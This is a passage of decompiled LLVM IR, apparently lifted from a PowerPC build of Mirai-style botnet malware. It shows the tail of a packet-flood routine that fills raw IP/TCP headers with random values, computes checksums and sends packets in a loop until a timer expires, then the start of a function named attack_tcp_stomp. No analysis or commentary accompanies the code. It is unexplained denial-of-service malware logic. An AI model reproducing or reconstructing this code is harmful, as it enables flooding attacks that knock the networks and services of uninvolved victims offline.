  store i32 %v1_10002f20, i32* %r22.global-to-local, align 4
  %v0_10002f24 = load i32, i32* %r8.global-to-local, align 4
  %v3_10002f24 = icmp eq i32 %v0_10002f24, 0
  store i1 %v3_10002f24, i1* %cr7_eq.global-to-local, align 1
  %v0_10002f28 = call i32 @__asm_mfcr()
  store i32 %v0_10002f28, i32* %r3.global-to-local, align 4
  %v1_10002f2c = mul i32 %v0_10002f28, 268435456
  store i32 %v1_10002f2c, i32* %r23.global-to-local, align 4
  %v2_10002f3c = urem i32 %v0_10002d80, 16
  %v1_10002f44 = mul nuw i32 %v2_10002f3c, 268435456
  br label %dec_label_pc_10002f30

dec_label_pc_10002f30:                            ; preds = %dec_label_pc_1000304c, %dec_label_pc_10002ee8
  store i32 0, i32* %stack_var_-120, align 4
  store i32 %v2_10002f3c, i32* %r0.global-to-local, align 4
  %v1_10002f40 = call %0 @__asm_mtcrf(i32 1, i32 %v2_10002f3c)
  store i32 %v1_10002f44, i32* %r0.global-to-local, align 4
  %v0_10002f48 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10002f48, label %dec_label_pc_1000304c, label %dec_label_pc_10002f4c

dec_label_pc_10002f4c:                            ; preds = %dec_label_pc_10002f30
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10002f50

dec_label_pc_10002f50:                            ; preds = %dec_label_pc_10002fb8, %dec_label_pc_10002f4c
  %v0_10002f50 = phi i32 [ %v1_1000303c, %dec_label_pc_10002fb8 ], [ 0, %dec_label_pc_10002f4c ]
  %v1_10002f50 = mul i32 %v0_10002f50, 24
  store i32 %v1_10002f50, i32* %r0.global-to-local, align 4
  %v1_10002f54 = mul i32 %v0_10002f50, 4
  store i32 %v1_10002f54, i32* %r11.global-to-local, align 4
  %v1_10002f58 = load i32, i32* %r20.global-to-local, align 4
  %v2_10002f58 = add i32 %v1_10002f58, %v1_10002f54
  %v3_10002f58 = inttoptr i32 %v2_10002f58 to i32*
  %v4_10002f58 = load i32, i32* %v3_10002f58, align 4
  store i32 %v4_10002f58, i32* @r28, align 4
  %v1_10002f5c = load i32, i32* @r30, align 4
  %v2_10002f5c = add i32 %v1_10002f5c, %v1_10002f50
  store i32 %v2_10002f5c, i32* %r10.global-to-local, align 4
  %v1_10002f60 = add i32 %v2_10002f5c, 20
  %v2_10002f60 = inttoptr i32 %v1_10002f60 to i8*
  %v3_10002f60 = load i8, i8* %v2_10002f60, align 1
  %v4_10002f60 = zext i8 %v3_10002f60 to i32
  store i32 %v4_10002f60, i32* %r9.global-to-local, align 4
  %v1_10002f64 = add i32 %v4_10002f58, 24
  store i32 %v1_10002f64, i32* @r27, align 4
  %v1_10002f68 = add i32 %v4_10002f58, 44
  store i32 %v1_10002f68, i32* @r31, align 4
  %v3_10002f6c = icmp eq i8 %v3_10002f60, 31
  store i1 %v3_10002f6c, i1* %cr7_eq.global-to-local, align 1
  %tmp32 = icmp ult i8 %v3_10002f60, 32
  br i1 %tmp32, label %dec_label_pc_100030c0, label %dec_label_pc_10002f74

dec_label_pc_10002f74:                            ; preds = %dec_label_pc_10002f50
  %v0_10002f74 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10002f74, label %dec_label_pc_1000316c, label %dec_label_pc_10002f78

dec_label_pc_10002f78:                            ; preds = %dec_label_pc_100030c0, %dec_label_pc_10002f74
  %v0_10002f78 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10002f78, label %dec_label_pc_100030ec, label %dec_label_pc_10002f7c

dec_label_pc_10002f7c:                            ; preds = %dec_label_pc_1000316c, %dec_label_pc_10002f78
  %v0_10002f7c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10002f7c, label %dec_label_pc_10003108, label %dec_label_pc_10002f80

dec_label_pc_10002f80:                            ; preds = %dec_label_pc_100030ec, %dec_label_pc_10002f7c
  %v0_10002f80 = load i32, i32* %r21.global-to-local, align 4
  %v1_10002f80 = mul i32 %v0_10002f80, 16
  %v2_10002f80 = udiv i32 %v0_10002f80, 268435456
  %v3_10002f80 = or i32 %v2_10002f80, %v1_10002f80
  store i32 %v3_10002f80, i32* %r21.global-to-local, align 4
  %v1_10002f84 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10002f80)
  %v1_10002f88 = mul nuw i32 %v2_10002f80, 268435456
  %v2_10002f88 = urem i32 %v0_10002f80, 268435456
  %v3_10002f88 = or i32 %v1_10002f88, %v2_10002f88
  store i32 %v3_10002f88, i32* %r21.global-to-local, align 4
  %v0_10002f8c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10002f8c, label %dec_label_pc_10003120, label %dec_label_pc_10002f90

dec_label_pc_10002f90:                            ; preds = %dec_label_pc_10003108, %dec_label_pc_10002f80
  %v0_10002f90 = load i32, i32* %r22.global-to-local, align 4
  %v1_10002f90 = mul i32 %v0_10002f90, 16
  %v2_10002f90 = udiv i32 %v0_10002f90, 268435456
  %v3_10002f90 = or i32 %v2_10002f90, %v1_10002f90
  store i32 %v3_10002f90, i32* %r22.global-to-local, align 4
  %v1_10002f94 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10002f90)
  %v1_10002f98 = mul nuw i32 %v2_10002f90, 268435456
  %v2_10002f98 = urem i32 %v0_10002f90, 268435456
  %v3_10002f98 = or i32 %v1_10002f98, %v2_10002f98
  store i32 %v3_10002f98, i32* %r22.global-to-local, align 4
  %v0_10002f9c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10002f9c, label %dec_label_pc_10003138, label %dec_label_pc_10002fa0

dec_label_pc_10002fa0:                            ; preds = %dec_label_pc_10003120, %dec_label_pc_10002f90
  %v0_10002fa0 = load i32, i32* @r28, align 4
  %v1_10002fa0 = add i32 %v0_10002fa0, 16
  %v2_10002fa0 = inttoptr i32 %v1_10002fa0 to i32*
  %v3_10002fa0 = load i32, i32* %v2_10002fa0, align 4
  store i32 %v3_10002fa0, i32* %r0.global-to-local, align 4
  %v0_10002fa4 = load i32, i32* %r23.global-to-local, align 4
  %v1_10002fa4 = mul i32 %v0_10002fa4, 16
  %v2_10002fa4 = udiv i32 %v0_10002fa4, 268435456
  %v3_10002fa4 = or i32 %v2_10002fa4, %v1_10002fa4
  store i32 %v3_10002fa4, i32* %r23.global-to-local, align 4
  %v1_10002fa8 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10002fa4)
  %v1_10002fac = mul nuw i32 %v2_10002fa4, 268435456
  %v2_10002fac = urem i32 %v0_10002fa4, 268435456
  %v3_10002fac = or i32 %v1_10002fac, %v2_10002fac
  store i32 %v3_10002fac, i32* %r23.global-to-local, align 4
  %v0_10002fb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002fb0 = load i32, i32* @r27, align 4
  %v2_10002fb0 = add i32 %v1_10002fb0, 16
  %v3_10002fb0 = inttoptr i32 %v2_10002fb0 to i32*
  store i32 %v0_10002fb0, i32* %v3_10002fb0, align 4
  %v0_10002fb4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10002fb4, label %dec_label_pc_10002fb8, label %dec_label_pc_10003150

dec_label_pc_10002fb8:                            ; preds = %dec_label_pc_10002fa0, %dec_label_pc_10003138, %dec_label_pc_10003150
  store i32 0, i32* %r29.global-to-local, align 4
  %v2_10002fc0 = load i32, i32* @r28, align 4
  %v3_10002fc0 = add i32 %v2_10002fc0, 10
  %v4_10002fc0 = inttoptr i32 %v3_10002fc0 to i16*
  store i16 0, i16* %v4_10002fc0, align 2
  %v0_10002fc4 = load i32, i32* @r28, align 4
  store i32 %v0_10002fc4, i32* @r3, align 4
  %v2_10002fc8 = call i32 @checksum_generic(i32 %v0_10002fc4, i32 20)
  %v3_10002fc8 = trunc i32 %v2_10002fc8 to i16
  %v3_10002fd0 = load i32, i32* @r28, align 4
  %v4_10002fd0 = add i32 %v3_10002fd0, 10
  %v5_10002fd0 = inttoptr i32 %v4_10002fd0 to i16*
  store i16 %v3_10002fc8, i16* %v5_10002fd0, align 2
  %v0_10002fd4 = load i32, i32* @r27, align 4
  store i32 %v0_10002fd4, i32* @r3, align 4
  %v0_10002fd8 = load i32, i32* %r29.global-to-local, align 4
  %v1_10002fd8 = trunc i32 %v0_10002fd8 to i16
  %v3_10002fd8 = add i32 %v0_10002fd4, 10
  %v4_10002fd8 = inttoptr i32 %v3_10002fd8 to i16*
  store i16 %v1_10002fd8, i16* %v4_10002fd8, align 2
  %v2_10002fdc = call i32 @checksum_generic(i32 %v0_10002fd4, i32 20)
  %v3_10002fdc = trunc i32 %v2_10002fdc to i16
  %v0_10002fe0 = load i32, i32* @r31, align 4
  store i32 %v0_10002fe0, i32* @r4, align 4
  %v3_10002fe4 = load i32, i32* @r27, align 4
  %v4_10002fe4 = add i32 %v3_10002fe4, 10
  %v5_10002fe4 = inttoptr i32 %v4_10002fe4 to i16*
  store i16 %v3_10002fdc, i16* %v5_10002fe4, align 2
  %v0_10002fe8 = load i32, i32* @r25, align 4
  %v0_10002fec = load i32, i32* %r29.global-to-local, align 4
  %v1_10002fec = trunc i32 %v0_10002fec to i16
  %v2_10002fec = load i32, i32* @r31, align 4
  %v3_10002fec = add i32 %v2_10002fec, 6
  %v4_10002fec = inttoptr i32 %v3_10002fec to i16*
  store i16 %v1_10002fec, i16* %v4_10002fec, align 2
  %v0_10002ff0 = load i32, i32* @r27, align 4
  store i32 %v0_10002ff0, i32* %r3.global-to-local, align 4
  %v0_10002ff4 = load i32, i32* @r31, align 4
  %v1_10002ff4 = add i32 %v0_10002ff4, 4
  %v2_10002ff4 = inttoptr i32 %v1_10002ff4 to i16*
  %v3_10002ff4 = load i16, i16* %v2_10002ff4, align 2
  %v4_10002ff4 = zext i16 %v3_10002ff4 to i32
  %v4_10002ff8 = call i32 @checksum_tcpudp(i32 %v0_10002ff0, i32 %v0_10002fe0, i32 %v4_10002ff4, i32 %v0_10002fe8)
  %v5_10002ff8 = trunc i32 %v4_10002ff8 to i16
  store i32 %v4_10002ff8, i32* %r3.global-to-local, align 4
  %v3_10002ffc = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10002ffc, i32* %r0.global-to-local, align 4
  %v0_10003000 = load i32, i32* @r28, align 4
  %v1_10003000 = add i32 %v0_10003000, 16
  %v2_10003000 = inttoptr i32 %v1_10003000 to i32*
  %v3_10003000 = load i32, i32* %v2_10003000, align 4
  store i32 %v3_10003000, i32* %r11.global-to-local, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  %v1_10003008 = mul i32 %v3_10002ffc, 24
  store i32 %v1_10003008, i32* %r0.global-to-local, align 4
  %v3_1000300c = load i32, i32* @r31, align 4
  %v4_1000300c = add i32 %v3_1000300c, 6
  %v5_1000300c = inttoptr i32 %v4_1000300c to i16*
  store i16 %v5_10002ff8, i16* %v5_1000300c, align 2
  %v0_10003010 = load i32, i32* @r28, align 4
  %v0_10003014 = load i32, i32* @r24, align 4
  store i32 %v0_10003014, i32* %r3.global-to-local, align 4
  %v0_10003018 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003018 = load i32, i32* @r30, align 4
  %v2_10003018 = add i32 %v1_10003018, %v0_10003018
  %v0_1000301c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000301c = trunc i32 %v0_1000301c to i16
  %v5_1000301c = inttoptr i32 %v2_10003018 to i16*
  store i16 %v3_1000301c, i16* %v5_1000301c, align 2
  %v0_10003020 = load i32, i32* %r11.global-to-local, align 4
  %v2_10003020 = add i32 %v2_10003018, 4
  %v3_10003020 = inttoptr i32 %v2_10003020 to i32*
  store i32 %v0_10003020, i32* %v3_10003020, align 4
  %v0_10003024 = load i32, i32* @r26, align 4
  %v0_10003028 = load i32, i32* %r29.global-to-local, align 4
  %v1_10003028 = trunc i32 %v0_10003028 to i16
  %v3_10003028 = add i32 %v2_10003018, 2
  %v4_10003028 = inttoptr i32 %v3_10003028 to i16*
  store i16 %v1_10003028, i16* %v4_10003028, align 2
  store i32 16, i32* %r8.global-to-local, align 4
  store i32 268447800, i32* @lr, align 4
  %v6_10003034 = call i32 @__libc_sendto(i32 %v0_10003014, i32 %v0_10003010, i32 %v0_10003024, i32 16384, i32 %v2_10003018, i32 16)
  store i32 %v6_10003034, i32* %r3.global-to-local, align 4
  %v3_10003038 = load i32, i32* %stack_var_-120, align 4
  %v1_1000303c = add i32 %v3_10003038, 1
  store i32 %v1_1000303c, i32* %r9.global-to-local, align 4
  %v1_10003040 = load i32, i32* %r19.global-to-local, align 4
  %v2_10003040 = icmp slt i32 %v1_1000303c, %v1_10003040
  %v4_10003040 = icmp eq i32 %v1_1000303c, %v1_10003040
  store i1 %v4_10003040, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_1000303c, i32* %stack_var_-120, align 4
  br i1 %v2_10003040, label %dec_label_pc_10002f50, label %dec_label_pc_1000304c

dec_label_pc_1000304c:                            ; preds = %dec_label_pc_10002fb8, %dec_label_pc_10002f30
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10003050 = call i32 @__GI_time()
  store i32 %v0_10003050, i32* %r3.global-to-local, align 4
  store i32 %v2_10002d2c, i32* %r0.global-to-local, align 4
  %v2_10003058 = icmp slt i32 %v2_10002d2c, %v0_10003050
  %v4_10003058 = icmp eq i32 %v2_10002d2c, %v0_10003050
  store i1 %v4_10003058, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10003058, label %dec_label_pc_10003060, label %dec_label_pc_10002f30

dec_label_pc_10003060:                            ; preds = %dec_label_pc_1000304c, %entry, %dec_label_pc_1000317c
  store i32 %v0_10002bc0, i32* %r0.global-to-local, align 4
  %v1_10003074 = call %0 @__asm_mtcrf(i32 56, i32 %v0_10002b9c)
  store i32 %v0_10002ba8, i32* %r21.global-to-local, align 4
  store i32 %v0_10002bdc, i32* %r22.global-to-local, align 4
  store i32 %v0_10002be0, i32* %r23.global-to-local, align 4
  store i32 %v0_10002be8, i32* %r25.global-to-local, align 4
  store i32 %v0_10002bec, i32* %r26.global-to-local, align 4
  store i32 %v0_10002bf0, i32* %r28.global-to-local, align 4
  store i32 %v0_10002bf8, i32* %r29.global-to-local, align 4
  store i32 %v0_10002c08, i32* %r31.global-to-local, align 4
  %v0_100030bc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100030bc

dec_label_pc_100030c0:                            ; preds = %dec_label_pc_10002f50
  %v1_100030c0 = add i32 %v2_10002f5c, 16
  %v2_100030c0 = inttoptr i32 %v1_100030c0 to i32*
  %v3_100030c0 = load i32, i32* %v2_100030c0, align 4
  store i32 %v3_100030c0, i32* %r29.global-to-local, align 4
  %v0_100030c4 = call i32 @rand_next()
  store i32 %v0_100030c4, i32* %r3.global-to-local, align 4
  %v3_100030c8 = load i32, i32* %stack_var_-120, align 4
  %v1_100030cc = mul i32 %v3_100030c8, 24
  %v1_100030d0 = load i32, i32* @r30, align 4
  %v2_100030d0 = add i32 %v1_100030d0, %v1_100030cc
  store i32 %v2_100030d0, i32* %r9.global-to-local, align 4
  %v1_100030d4 = add i32 %v2_100030d0, 20
  %v2_100030d4 = inttoptr i32 %v1_100030d4 to i8*
  %v3_100030d4 = load i8, i8* %v2_100030d4, align 1
  %v4_100030d4 = zext i8 %v3_100030d4 to i32
  store i32 %v4_100030d4, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_100030d4, 64
  %v2_100030d8 = zext i8 %tmp to i32
  %v3_100030d8 = lshr i32 %v0_100030c4, %v2_100030d8
  %v1_100030dc = load i32, i32* %r29.global-to-local, align 4
  %v2_100030dc = add i32 %v3_100030d8, %v1_100030dc
  store i32 %v2_100030dc, i32* %r3.global-to-local, align 4
  %v1_100030e0 = load i32, i32* @r28, align 4
  %v2_100030e0 = add i32 %v1_100030e0, 16
  %v3_100030e0 = inttoptr i32 %v2_100030e0 to i32*
  store i32 %v2_100030dc, i32* %v3_100030e0, align 4
  %v0_100030e4 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_100030e4, label %dec_label_pc_1000316c, label %dec_label_pc_10002f78

dec_label_pc_100030ec:                            ; preds = %dec_label_pc_1000316c, %dec_label_pc_10002f78
  %v0_100030ec = call i32 @rand_next()
  %v1_100030f0 = urem i32 %v0_100030ec, 65536
  store i32 %v1_100030f0, i32* %r3.global-to-local, align 4
  %v1_100030f4 = add nsw i32 %v1_100030f0, -1000
  store i32 %v1_100030f4, i32* %r0.global-to-local, align 4
  %v1_100030f8 = trunc i32 %v0_100030ec to i16
  %v2_100030f8 = load i32, i32* @r28, align 4
  %v3_100030f8 = add i32 %v2_100030f8, 4
  %v4_100030f8 = inttoptr i32 %v3_100030f8 to i16*
  store i16 %v1_100030f8, i16* %v4_100030f8, align 2
  %v0_100030fc = load i32, i32* %r0.global-to-local, align 4
  %v1_100030fc = sub i32 -1, %v0_100030fc
  store i32 %v1_100030fc, i32* %r0.global-to-local, align 4
  %v1_10003100 = trunc i32 %v1_100030fc to i16
  %v2_10003100 = load i32, i32* @r27, align 4
  %v3_10003100 = add i32 %v2_10003100, 4
  %v4_10003100 = inttoptr i32 %v3_10003100 to i16*
  store i16 %v1_10003100, i16* %v4_10003100, align 2
  %v0_10003104 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10003104, label %dec_label_pc_10003108, label %dec_label_pc_10002f80

dec_label_pc_10003108:                            ; preds = %dec_label_pc_100030ec, %dec_label_pc_10002f7c
  %v0_10003108 = call i32 @rand_next()
  %v1_10003108 = trunc i32 %v0_10003108 to i16
  store i32 %v0_10003108, i32* %r3.global-to-local, align 4
  %v0_1000310c = load i32, i32* %r21.global-to-local, align 4
  %v1_1000310c = mul i32 %v0_1000310c, 16
  %v2_1000310c = udiv i32 %v0_1000310c, 268435456
  %v3_1000310c = or i32 %v2_1000310c, %v1_1000310c
  store i32 %v3_1000310c, i32* %r21.global-to-local, align 4
  %v1_10003110 = call %0 @__asm_mtcrf(i32 1, i32 %v3_1000310c)
  %v1_10003114 = mul nuw i32 %v2_1000310c, 268435456
  %v2_10003114 = urem i32 %v0_1000310c, 268435456
  %v3_10003114 = or i32 %v1_10003114, %v2_10003114
  store i32 %v3_10003114, i32* %r21.global-to-local, align 4
  %v3_10003118 = load i32, i32* @r28, align 4
  %v4_10003118 = add i32 %v3_10003118, 44
  %v5_10003118 = inttoptr i32 %v4_10003118 to i16*
  store i16 %v1_10003108, i16* %v5_10003118, align 2
  %v0_1000311c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000311c, label %dec_label_pc_10003120, label %dec_label_pc_10002f90

dec_label_pc_10003120:                            ; preds = %dec_label_pc_10003108, %dec_label_pc_10002f80
  %v0_10003120 = call i32 @rand_next()
  %v1_10003120 = trunc i32 %v0_10003120 to i16
  store i32 %v0_10003120, i32* %r3.global-to-local, align 4
  %v0_10003124 = load i32, i32* %r22.global-to-local, align 4
  %v1_10003124 = mul i32 %v0_10003124, 16
  %v2_10003124 = udiv i32 %v0_10003124, 268435456
  %v3_10003124 = or i32 %v2_10003124, %v1_10003124
  store i32 %v3_10003124, i32* %r22.global-to-local, align 4
  %v1_10003128 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10003124)
  %v1_1000312c = mul nuw i32 %v2_10003124, 268435456
  %v2_1000312c = urem i32 %v0_10003124, 268435456
  %v3_1000312c = or i32 %v1_1000312c, %v2_1000312c
  store i32 %v3_1000312c, i32* %r22.global-to-local, align 4
  %v3_10003130 = load i32, i32* @r31, align 4
  %v4_10003130 = add i32 %v3_10003130, 2
  %v5_10003130 = inttoptr i32 %v4_10003130 to i16*
  store i16 %v1_10003120, i16* %v5_10003130, align 2
  %v0_10003134 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10003134, label %dec_label_pc_10003138, label %dec_label_pc_10002fa0

dec_label_pc_10003138:                            ; preds = %dec_label_pc_10003120, %dec_label_pc_10002f90
  %v0_10003138 = call i32 @rand_next()
  store i32 %v0_10003138, i32* %r3.global-to-local, align 4
  %v0_1000313c = load i32, i32* %r23.global-to-local, align 4
  %v1_1000313c = mul i32 %v0_1000313c, 16
  %v2_1000313c = udiv i32 %v0_1000313c, 268435456
  %v3_1000313c = or i32 %v2_1000313c, %v1_1000313c
  store i32 %v3_1000313c, i32* %r23.global-to-local, align 4
  %v1_10003140 = call %0 @__asm_mtcrf(i32 1, i32 %v3_1000313c)
  %v1_10003144 = mul nuw i32 %v2_1000313c, 268435456
  %v2_10003144 = urem i32 %v0_1000313c, 268435456
  %v3_10003144 = or i32 %v1_10003144, %v2_10003144
  store i32 %v3_10003144, i32* %r23.global-to-local, align 4
  %v1_10003148 = load i32, i32* @r27, align 4
  %v2_10003148 = add i32 %v1_10003148, 16
  %v3_10003148 = inttoptr i32 %v2_10003148 to i32*
  store i32 %v0_10003138, i32* %v3_10003148, align 4
  %v0_1000314c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000314c, label %dec_label_pc_10002fb8, label %dec_label_pc_10003150

dec_label_pc_10003150:                            ; preds = %dec_label_pc_10002fa0, %dec_label_pc_10003138
  %v0_10003150 = load i32, i32* @r31, align 4
  %v1_10003150 = add i32 %v0_10003150, 8
  store i32 %v1_10003150, i32* @r29, align 4
  %v0_10003154 = load i32, i32* %r18.global-to-local, align 4
  store i32 %v0_10003154, i32* @r4, align 4
  store i32 %v1_10003150, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10003160.78 to i32), i32* @lr, align 4
  %v0_1000315c = call i32 @rand_alphastr()
  store i32 %v0_1000315c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10003164 = load i32, i32* @r29, align 4
  %v2_10003164 = load i32, i32* %r18.global-to-local, align 4
  %v4_10003164 = add i32 %v2_10003164, %v1_10003164
  %v5_10003164 = inttoptr i32 %v4_10003164 to i8*
  store i8 0, i8* %v5_10003164, align 1
  br label %dec_label_pc_10002fb8

dec_label_pc_1000316c:                            ; preds = %dec_label_pc_100030c0, %dec_label_pc_10002f74
  %v0_1000316c = call i32 @rand_next()
  store i32 %v0_1000316c, i32* %r3.global-to-local, align 4
  %v1_10003170 = load i32, i32* @r28, align 4
  %v2_10003170 = add i32 %v1_10003170, 12
  %v3_10003170 = inttoptr i32 %v2_10003170 to i32*
  store i32 %v0_1000316c, i32* %v3_10003170, align 4
  %v0_10003174 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10003174, label %dec_label_pc_100030ec, label %dec_label_pc_10002f7c

dec_label_pc_1000317c:                            ; preds = %dec_label_pc_10002d4c
  %v0_1000317c = load i32, i32* @r24, align 4
  store i32 %v0_1000317c, i32* @r3, align 4
  %v0_10003180 = call i32 @__GI___libc_close()
  store i32 %v0_10003180, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003060

; uselistorder directives
  uselistorder i32 %v0_1000313c, { 2, 1, 0 }
  uselistorder i32 %v0_10003124, { 2, 1, 0 }
  uselistorder i32 %v0_10003120, { 1, 0 }
  uselistorder i32 %v0_1000310c, { 2, 1, 0 }
  uselistorder i32 %v0_10003108, { 1, 0 }
  uselistorder i32 %v1_100030fc, { 1, 0 }
  uselistorder i32 %v1_100030f0, { 1, 0 }
  uselistorder i32 %v0_100030ec, { 1, 0 }
  uselistorder i32 %v0_10003050, { 1, 0, 2 }
  uselistorder i32 %v1_1000303c, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v2_10003018, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10002ff8, { 1, 0 }
  uselistorder i32 %v0_10002fa4, { 2, 1, 0 }
  uselistorder i32 %v0_10002f90, { 2, 1, 0 }
  uselistorder i32 %v0_10002f80, { 2, 1, 0 }
  uselistorder i32 %v4_10002f58, { 1, 0, 2 }
  uselistorder i32 %v1_10002f54, { 1, 0 }
  uselistorder i32 %v2_10002f3c, { 2, 1, 0 }
  uselistorder i32 %v1_10002ebc, { 1, 0 }
  uselistorder i32 %v4_10002e20, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10002e14, { 1, 0 }
  uselistorder i32 %v0_10002e14, { 1, 0 }
  uselistorder i32 %v1_10002e08, { 1, 0 }
  uselistorder i32 %v1_10002de8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10002da4, { 2, 1, 0 }
  uselistorder i32 %v0_10002da4, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10002d90, { 1, 0 }
  uselistorder i32 %v1_10002d8c, { 1, 0 }
  uselistorder i32 %v1_10002d88, { 1, 0 }
  uselistorder i32 %v2_10002d2c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15, 8, 9, 16, 17 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 3, 4, 17, 18, 19, 20, 21 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 24, 14, 15, 16, 17, 18, 19, 1, 0, 3, 20, 21, 22, 2, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 4 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 8, 17 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 2, 3, 7, 4, 5, 6 }
  uselistorder i32* %r23.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32* %r22.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %r21.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 20, 21, 26, 22, 23, 24, 25, 27, 28, 29, 30, 31, 16, 17, 32, 33, 34, 35, 36 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i8 47, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_10003150, { 1, 0 }
  uselistorder label %dec_label_pc_10003060, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10002fb8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002ea8, { 1, 0 }
  uselistorder label %dec_label_pc_10002e60, { 1, 0 }
  uselistorder label %dec_label_pc_10002df8, { 1, 0, 2 }
}

define i32 @attack_tcp_stomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i16 @__decompiler_undefined_function_1()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-384 = alloca i32, align 4
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %v0_1000318c = load i32, i32* @lr, align 4
  store i32 %v0_1000318c, i32* %r0.global-to-local, align 4
  %v0_10003190 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* @r21, align 4
  store i32 0, i32* @r24, align 4
  store i32 %v0_10003190, i32* @r27, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v0_100031b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  %v0_100031e8 = load i32, i32* @r26, align 4
  store i32 %arg5, i32* @r28, align 4
  %v0_100031f4 = load i32, i32* @r29, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  %v0_100031fc = load i32, i32* @r30, align 4
  store i32 0, i32* %stack_var_-424, align 4
  store i32 268448268, i32* @lr, align 4
  %v2_10003208 = call i32 @calloc(i32 %arg2, i32 16)
  store i32 %v2_10003208, i32* %r19.global-to-local, align 4
  %v0_10003214 = load i32, i32* @r21, align 4
  store i32 %v0_10003214, i32* %r3.global-to-local, align 4
  store i32 268448284, i32* @lr, align 4
  %v2_10003218 = call i32 @calloc(i32 %v0_10003214, i32 4)
  %v0_1000321c = load i32, i32* @r28, align 4
  store i32 %v2_10003218, i32* %r20.global-to-local, align 4
  %v0_1000322c = load i32, i32* @r29, align 4
  store i32 %v0_1000322c, i32* %r3.global-to-local, align 4
  store i32 268448308, i32* @lr, align 4
  %v4_10003230 = inttoptr i32 %v0_1000321c to i32*
  %v5_10003230 = call i32 @attack_get_opt_int(i32 %v0_1000322c, i32* %v4_10003230, i32 2, i32 0)
